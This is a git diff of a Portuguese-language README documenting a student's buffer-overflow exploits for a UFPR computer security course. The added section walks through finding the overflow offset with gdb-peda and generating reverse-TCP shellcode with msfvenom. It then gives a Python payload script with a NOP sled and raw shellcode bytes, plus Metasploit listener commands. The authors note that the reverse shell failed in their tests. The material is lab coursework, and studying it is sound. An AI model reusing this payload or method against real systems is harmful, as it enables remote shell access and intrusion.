@@ -1,6 +1,7 @@
 # buffer-overflow
 
 My buffer overflow attack for the Computational Security in UFPR
+
 ***
 
 ## Sumário
@@ -15,10 +16,8 @@ My buffer overflow attack for the Computational Security in UFPR
   - [Preparando o Shellcode](#preparando-o-shellcode)
 - [Explorando o segundo buffer overflow](#explorando-o-segundo-buffer-overflow)
   - [Objetivo](#objetivo-1)
-  - [Descobrindo o tamanho do buffer](#descobrindo-o-tamanho-do-buffer-1)
-  - [Descobrindo o endereço do registrador de retorno](#descobrindo-o-endereço-do-registrador-de-retorno-1)
-  - [Descobrindo a distancia entre o buffer e o registrador de retorno](#descobrindo-a-distancia-entre-o-buffer-e-o-registrador-de-retorno-1)
   - [Preparando o shellcode](#preparando-o-shellcode-1)
+  - [Executando o shellcode](#executando-o-shellcode)
 
 ## Facilitador
 
@@ -57,6 +56,8 @@ Segmentation fault (core dumped)
 
 Podemos ver que o programa é vunerável a buffer overflow.
 
+***
+
 ### Objetivo
 
 Para explorar o buffer overflow e abrir uma shell, iremos seguir os seguintes passos:
@@ -66,6 +67,8 @@ Para explorar o buffer overflow e abrir uma shell, iremos seguir os seguintes pa
 3. descobrir a distancia entre o buffer e o registrador de retorno
 4. preencher o buffer com um padding, sobrescrever o endereço de retorno por uma variável de ambiente
 5. executar o programa
+
+***
 
 ### Descobrindo o endereço do buffer
 
@@ -123,6 +126,8 @@ $2 = (char (*)[9]) 0x7fffffffdc83
 
 Assim o endereço do buffer é `0x7fffffffdc83`
 
+***
+
 ### Descobrindo o endereço do registrador de retorno
 
 De forma similar, podemos descobrir o endereço do registrador de retorno utilizando:
@@ -140,6 +145,8 @@ Stack level 0, frame at 0x7fffffffdca0:
 
 Assim o endereço do registrador de retorno é `0x7fffffffdc98`
 
+***
+
 ### Descobrindo a distancia entre o buffer e o registrador de retorno
 
 Para descobrirmos a distancia entre o buffer e o registrador de retorno, basta subtrair os dois endereços:
@@ -150,6 +157,8 @@ $6 = 21
 ```
 
 Isso significa que precisaremos de um padding de `21 bytes` para preencher o buffer e chegar no registrador de retorno.
+
+***
 
 ### Preparando o shellcode
 
@@ -216,6 +225,8 @@ Stack level 0, frame at 0x7fffffffdc80:
 0x7fffffffdc78: 0xffffe234
 ```
 
+***
+
 ### Executando o shellcode
 
 Para executar o shellcode, vamos utilizar o seguinte comando:
@@ -226,6 +237,8 @@ Para executar o shellcode, vamos utilizar o seguinte comando:
 
 receberemos um shell com permissões do usuário que executou o programa.
 
+***
+
 ## Explorando o segundo buffer overflow
 
 ## introdução
@@ -233,7 +246,7 @@ receberemos um shell com permissões do usuário que executou o programa.
 Temos um programa que executa um servidor na porta escolhida. Vamos rodar o programa e enviar comandos para o servidor através do telnet.
 
 ```bash
-./bufferoverflow2.elf 1234
+./badserver.elf 1234
 ```
 
 ```bash
@@ -242,25 +255,131 @@ telnet localhost 1234
 
 Assim podemos enviar comandos para o servidor e receber a resposta.
 
+***
+
 ### Objetivo
 
 O objetivo é conseguir executar um shellcode que faça uma shell reversa para o nossa máquina.
 
+***
+
 ### Descobrindo o tamanho do buffer
 
-Como não temos o código fonte do programa, vamos utilizar o gdb para descobrir o tamanho do buffer.
+Como não temos o código fonte do programa, vamos utilizar o `gdb-peda` para descobrir o tamanho do buffer.
 
-o tamanho máximo é 40
+Usando o comando `pattern create 500`, podemos criar um input de 500 bytes para o programa. Se executarmos o programa com esse input, ele irá travar e o gdb irá nos mostrar o valor dos registradores na hora do travamento.
 
-### Descobrindo o endereço do buffer
+com isso, conseguimos descobrir o valor do registrador `rip` na hora do travamento:
 
-Para descobrirmos o endereço do buffer podemos fazer:
+```gdb
+RBP: 0x6141414541412941 ('A)AAEAAa')
+```
 
-### Descobrindo a distancia entre o buffer e o registrador de retorno
+com isso, podemos descobrir o tamanho do buffer:
+  
+```gdb
+(gdb) pattern offset 0x6141414541412941
+7007954260868540737 found at offset: 40
+```
+
+Dessa forma, descobrimos que o tamanho máximo do buffer é de `40 bytes`
+
+***
 
 ### Preparando o shellcode
 
+Iremos utilizar novamente o msfvenom para gerar o shellcode:
+
+```bash
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.0.10 LPORT=5000 -f python -b "\x00".
+```
+
+salvaremos o shellcode resultante em um arquivo `payload.txt`.
+
+***
+
 ### Executando o shellcode
+
+Para que a shell reversa funcione, precisamos que o programa execute o shellcode. Para isso, vamos construir nosso payload da seguinte forma:
+
+- Preencher o buffer com 40 bytes de padding
+- Preencher sobrescrever o endereço de retorno com um endereço a frente do RIP
+- Preencher com alguns NOP's
+- Preencher com o shellcode
+
+Nosso programa ficou algo como:
+
+```python
+from struct import pack
+
+buf = "A" * 40
+buf += pack("<Q", 0x00005555555553FD + 8)  # return address
+# add nops
+buf += b"\x90" * 100
+# add shellcode
+buf += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d"
+buf += b"\x05\xef\xff\xff\xff\x48\xbb\xd6\x4f\x8e\x24\x93"
+buf += b"\xf8\x52\x0a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
+buf += b"\xff\xe2\xf4\xe7\xb0\xe4\x2d\xcb\x61\xe4\x1a\x9e"
+buf += b"\xc6\x58\x69\xa2\x31\x38\x28\x97\x15\xe4\x23\xc9"
+buf += b"\xf7\x57\x42\x53\x8f\xf6\x75\xf9\xf2\x13\x53\x86"
+buf += b"\x25\xa7\x7c\x0a\x92\x50\x55\xbc\x4e\xd0\x2b\x96"
+buf += b"\xb0\xd7\xca\xae\x74\xc6\xb3\xdb\x41\x50\x0a\xc5"
+buf += b"\xc7\x4e\x8c\x93\xf2\x03\x42\x5f\xa9\xe4\x34\xc9"
+buf += b"\x92\x78\x52\xd9\x4a\xd7\x6c\x16\x38\x2b\x2f\x9f"
+buf += b"\xb0\x47\x50\x8b\xaf\x38\x29\x8e\x25\x8e\x4e\x96"
+buf += b"\xb0\xdb\xed\x9e\x7e\x78\x2b\x96\xa1\x0b\x55\x9e"
+buf += b"\xca\x4e\x5d\x54\x92\x6e\x52\xbc\x4e\xd1\x2b\x96"
+buf += b"\xa6\x38\x2c\x8c\x40\x8b\x6c\x16\x38\x2a\xe7\x29"
+buf += b"\xa9\x8e\x24\x93\xf8\x52\x0a"
+
+
+with open("payload.txt", "w") as f:
+    f.write(buf)
+```
+
+Somamos 8 com o objetivo de pular o endereço de retorno e cair nos NOP's. O endereço de retorno foi descoberto através do comando `info frame` no gdb peda.
+
+Para executar o shellcode, precisamos também de um listener na porta 5000. Para isso, vamos utilizar o msfconsole:
+
+```bash
+msfconsole
+```
+
+```bash
+use exploit/multi/handler
+set payload linux/x64/shell/reverse_tcp
+set LHOST 192.168.0.10
+set LPORT 5000
+run
+```
+
+Agora, basta executar o programa e enviar o payload:
+
+```bash
+./badserver.elf 1234
+```
+
+```bash
+telnet localhost 1234 < payload.txt
+```
+
+Com isso deveriamos receber uma conexão reversa no msfconsole.
+
+Infelizmente não conseguimos realizar a shell reversa. Durante os testes, conseguimos substituir o endereço de retorno, mas não conseguiamos enxergar os NOP's e o shellcode.
+
+```gdb
+gdb-peda$ x/50x $rsp
+0x7fffffffd810: 0x4141414141414141 0x4141414141414141
+0x7fffffffd820: 0x4141414141414141 0x4141414141414141
+0x7fffffffd830: 0x0041414141414141 0x0000000000000000
+# deveriamos ver os NOP's e o shellcode aqui
+0x7fffffffd840: 0x00007ffff7c0d560 0x00007ffff7c7f1b0
+0x7fffffffd850: 0x000055555555554a 0x00007fffffffdc40
+0x7fffffffd860: 0x00007fffffffdc90 0x00007fffffffddc8
+```
+
+***
 
 ## Autores
 
